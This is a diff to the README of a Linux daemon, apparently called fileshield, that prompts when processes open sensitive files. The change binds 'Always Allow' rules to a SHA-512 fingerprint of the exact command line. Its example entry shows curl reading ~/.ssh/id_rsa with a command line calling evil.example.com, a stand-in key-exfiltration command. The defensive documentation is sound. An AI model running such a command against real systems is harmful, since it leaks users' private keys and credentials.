@@ -200,7 +200,7 @@ When an unknown process (e.g., `curl` spawned from `/tmp`) tries to open `/home/
 | --- | --- | --- | --- |
 | Allow Once | PID + binary + exact file | `user_ttl` seconds | no |
 | Allow Session | POSIX session + binary (+ SHA-512) + exact file | until the shell/session leader exits, capped by `session_ttl` | no |
-| Allow Always | binary SHA-512 + call chain + exact file | until removed | `runtime-allowlist.json` |
+| Allow Always | binary SHA-512 + call chain + exact file + exact command line | until removed | `runtime-allowlist.json` |
 | Deny Session | same key shape as Allow Session | same as Allow Session | no |
 | Deny Always | same key shape as Allow Always | until removed | `runtime-denylist.json` |
 | Deny | — | this attempt only | no |
@@ -220,19 +220,21 @@ Clicking **Always Allow** stores a fingerprinted entry in the daemon's in-memory
 | **Call chain** (up to 3 ancestors) | Prevents a different caller from inheriting the rule |
 | **SHA-512 of each ancestor exe** | Detects replaced parent binaries |
 | **Target file** | Least privilege: approving `kubectl` for `~/.kube/config` does not grant `~/.ssh/id_rsa` |
+| **Command line** (SHA-512 fingerprint) | Only the exact invocation, arguments included, stays silent: `kubectl get pods` does not authorize `kubectl get secrets` |
 
 **Example:** clicking *Always Allow* for the popup shown above records:
 
 ```text
 binary:         /usr/bin/curl     (sha512: a3f1…)
 target:         /home/user/.ssh/id_rsa
+command:        curl -s https://evil.example.com … (fingerprinted, not stored)
 parent[0]:      bash              (sha512: 7c82…)
 parent[1]:      systemd           (sha512: 0d4e…)
 ```
 
-A future `curl` call from `zsh` instead of `bash` will prompt again because the call chain differs. A trojaned `/usr/bin/curl` will also prompt again because its SHA-512 has changed, and the same binary reading `~/.aws/credentials` prompts because the target differs.
+A future `curl` call from `zsh` instead of `bash` will prompt again because the call chain differs. A trojaned `/usr/bin/curl` will also prompt again because its SHA-512 has changed. The same binary reading `~/.aws/credentials` prompts because the target differs, and invoking it with different arguments (e.g. `kubectl get pods` vs `kubectl get secrets`) prompts because the command line differs.
 
-> State files written by older versions without a `target_path` are dropped at load (fail closed) rather than treated as wildcard grants; the access is prompted again.
+> Only a SHA-512 fingerprint of the command line is persisted — arguments are never written to disk, so secrets passed on the command line do not end up in the state file. State entries written by older versions without a `target_path` or without a command fingerprint are dropped at load (fail closed) and the access is prompted again.
 
 #### Persistence
 
@@ -258,7 +260,7 @@ sudo rm /var/lib/fileshield/runtime-denylist.json
 sudo systemctl restart fileshield
 ```
 
-To view the current persisted entries:
+To view the current persisted entries (`fileshield-cli list` shows a short fingerprint of the bound command line):
 
 ```bash
 cat /var/lib/fileshield/runtime-allowlist.json | jq .
@@ -368,13 +370,14 @@ Unit tests cover the cache, config parser, session decisions, JSON state files, 
 make test
 
 # Build tests without running
-make build/test_cache build/test_config build/test_session build/test_persist build/test_utils
+make build/test_cache build/test_config build/test_session build/test_persist build/test_sha512 build/test_utils
 
 # Run a single test binary directly
 ./build/test_cache
 ./build/test_config
 ./build/test_session
 ./build/test_persist
+./build/test_sha512
 ./build/test_utils
 ```
 
